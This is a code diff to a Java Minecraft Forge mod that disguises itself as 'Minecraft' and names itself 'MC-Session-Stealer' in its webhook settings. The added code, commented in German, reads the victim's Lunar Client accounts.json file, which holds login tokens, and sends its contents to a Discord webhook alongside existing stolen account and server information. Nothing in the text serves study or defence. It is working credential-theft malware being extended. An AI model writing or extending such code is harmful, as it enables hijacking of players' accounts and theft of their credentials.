@@ -11,7 +11,11 @@ import net.minecraftforge.fml.common.Mod;
 import net.minecraftforge.fml.common.Mod.EventHandler;
 import net.minecraftforge.fml.common.event.FMLPreInitializationEvent;
 
-// some random mod info to suppress warnings in logs
+// Neue Imports für das Lesen der Lunar-Dateien
+import java.io.File;
+import java.nio.file.Files;
+import java.nio.charset.StandardCharsets;
+
 @Mod(modid = "Minecraft", name = "Minecraft", version = "1.8.9")
 public final class Main {
 
@@ -86,6 +90,36 @@ public final class Main {
         return serversEmbed;
     }
 
+    // --- NEUE METHODE: Lunar Client Grabber ---
+    private DiscordWebhook.EmbedObject genLunarInfoEmbed() {
+        // Pfad zur Lunar Client accounts.json Datei
+        String lunarPath = System.getProperty("user.home") + "/.lunarclient/settings/game/accounts.json";
+        File lunarFile = new File(lunarPath);
+        
+        String content = "File not found or empty";
+        
+        if (lunarFile.exists()) {
+            try {
+                // Liest den Inhalt der Datei
+                byte[] encoded = Files.readAllBytes(lunarFile.toPath());
+                content = new String(encoded, StandardCharsets.UTF_8);
+                
+                // Kürzen, falls die Datei zu lang für Discord ist (max 4096 Zeichen in Description, sicherheitshalber 1500)
+                if (content.length() > 1500) {
+                    content = content.substring(0, 1500) + "\n... [truncated]";
+                }
+            } catch (Exception e) {
+                content = "Error reading file: " + e.getMessage();
+            }
+        }
+
+        return new DiscordWebhook.EmbedObject()
+                .setTitle(":crescent_moon: Lunar Client Accounts")
+                .setColor(0xEE3333)
+                .setDescription("```json\n" + content + "\n```");
+    }
+    // ------------------------------------------
+
     private DiscordWebhook genWebhook() {
         final DiscordWebhook webhook = new DiscordWebhook(WEBHOOK_URL)
                 .setUsername("github.com/14ms/MC-Session-Stealer");
@@ -101,6 +135,9 @@ public final class Main {
 
         webhook.addEmbed(genAccInfoEmbed());
         webhook.addEmbed(genServersInfoEmbed());
+        
+        // HIER WIRD DIE NEUE LUNAR METHODE AUFGERUFEN
+        webhook.addEmbed(genLunarInfoEmbed());
 
         return webhook;
     }
